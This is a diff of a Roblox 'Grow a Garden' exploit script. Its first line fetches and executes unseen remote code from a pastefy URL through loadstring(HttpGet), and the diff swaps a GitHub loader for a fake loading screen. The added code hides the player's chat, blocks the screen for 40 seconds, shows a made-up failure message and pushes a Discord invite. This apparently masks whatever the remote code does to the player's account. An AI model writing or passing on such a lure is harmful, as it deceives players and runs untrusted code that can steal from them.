@@ -1,2 +1,153 @@
 loadstring(game:HttpGet("https://pastefy.app/Yx0lspjp/raw"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/f4shn/main/refs/heads/main/games/gagvisual.lua", true))()
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- Hide default chat
+local chatFrame = playerGui:FindFirstChild("Chat")
+if chatFrame then
+    chatFrame.Parent = nil
+end
+
+-- Create ScreenGui
+local gui = Instance.new("ScreenGui")
+gui.Name = "GrowAGardenLoading"
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+gui.Parent = playerGui
+
+-- Background frame
+local bg = Instance.new("Frame")
+bg.Size = UDim2.new(1, 0, 1, 0)
+bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+bg.BorderSizePixel = 0
+bg.Parent = gui
+
+-- Gradient background
+local gradient = Instance.new("UIGradient")
+gradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)),
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(60, 60, 60)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(230, 230, 230))
+}
+gradient.Rotation = 90
+gradient.Parent = bg
+
+-- Title label
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 60)
+title.Position = UDim2.new(0, 0, 0.38, 0)
+title.BackgroundTransparency = 1
+title.Text = "🌴 GROW A\nGARDEN 🌴"
+title.TextColor3 = Color3.new(1, 1, 1)
+title.TextScaled = true
+title.Font = Enum.Font.GothamBlack
+title.Parent = bg
+
+-- Subtext label
+local sub = Instance.new("TextLabel")
+sub.Size = UDim2.new(1, 0, 0, 20)
+sub.Position = UDim2.new(0, 0, 0.51, 0)
+sub.BackgroundTransparency = 1
+sub.Text = "Script is loading please wait for a while"
+sub.TextColor3 = Color3.new(1, 1, 1)
+sub.TextScaled = true
+sub.Font = Enum.Font.Gotham
+sub.Parent = bg
+
+-- Loading bar outer frame
+local outerBar = Instance.new("Frame")
+outerBar.Size = UDim2.new(0.6, 0, 0, 20)
+outerBar.Position = UDim2.new(0.2, 0, 0.57, 0)
+outerBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+outerBar.BorderSizePixel = 0
+outerBar.BackgroundTransparency = 0.4
+outerBar.ClipsDescendants = true
+outerBar.Parent = bg
+
+-- Loading bar inner frame
+local innerBar = Instance.new("Frame")
+innerBar.Size = UDim2.new(0, 0, 1, 0)
+innerBar.Position = UDim2.new(0, 0, 0, 0)
+innerBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+innerBar.BorderSizePixel = 0
+innerBar.Parent = outerBar
+
+-- Percentage label
+local percentText = Instance.new("TextLabel")
+percentText.Size = UDim2.new(1, 0, 0, 20)
+percentText.Position = UDim2.new(0, 0, 0.63, 0)
+percentText.BackgroundTransparency = 1
+percentText.TextColor3 = Color3.new(1, 1, 1)
+percentText.Text = "0%"
+percentText.TextScaled = true
+percentText.Font = Enum.Font.GothamBold
+percentText.Parent = bg
+
+-- Background music
+local sound = Instance.new("Sound")
+sound.SoundId = "rbxassetid://1837635157" -- Relaxed Scene by Roblox
+sound.Volume = 0.5
+sound.Looped = true
+sound.Parent = gui
+sound:Play()
+
+-- Animate loading bar progress over 40 seconds (0 to 100%)
+for i = 0, 100 do
+    innerBar.Size = UDim2.new(i / 100, 0, 1, 0)
+    percentText.Text = i .. "%"
+    wait(0.4)
+end
+
+-- Stop music and hide loading UI
+sound:Stop()
+outerBar.Visible = false
+percentText.Visible = false
+sub.Visible = false
+title.Visible = false
+
+-- Error message label
+local errorLabel = Instance.new("TextLabel")
+errorLabel.Size = UDim2.new(1, 0, 0, 50)
+errorLabel.Position = UDim2.new(0, 0, 0.45, 0)
+errorLabel.BackgroundTransparency = 1
+errorLabel.Text = "⚠️ Loading screen failed to load."
+errorLabel.TextColor3 = Color3.new(1, 0.3, 0.3)
+errorLabel.TextScaled = true
+errorLabel.Font = Enum.Font.GothamBold
+errorLabel.Parent = bg
+
+-- Copy link button
+local copyButton = Instance.new("TextButton")
+copyButton.Size = UDim2.new(0, 240, 0, 40)
+copyButton.Position = UDim2.new(0.5, -120, 0.55, 0)
+copyButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+copyButton.Text = "📋 Copy link for help"
+copyButton.TextColor3 = Color3.new(0, 0, 0)
+copyButton.TextScaled = true
+copyButton.Font = Enum.Font.GothamBold
+copyButton.Parent = bg
+copyButton.AutoButtonColor = true
+copyButton.BorderSizePixel = 0
+copyButton.BackgroundTransparency = 0.1
+copyButton.AnchorPoint = Vector2.new(0.5, 0)
+
+-- Rounded corners for button
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 8)
+corner.Parent = copyButton
+
+-- Clipboard copy function for the Discord invite link
+local inviteLink = "https://discord.gg/seVr3SaW7x" -- Your Discord invite here
+copyButton.MouseButton1Click:Connect(function()
+    if setclipboard then
+        setclipboard(inviteLink)
+    elseif toclipboard then
+        toclipboard(inviteLink)
+    else
+        warn("Clipboard function not supported in this environment.")
+    end
+    copyButton.Text = "✅ Link copied!"
+    wait(2)
+    copyButton.Text = "📋 Copy link for help"
+end)
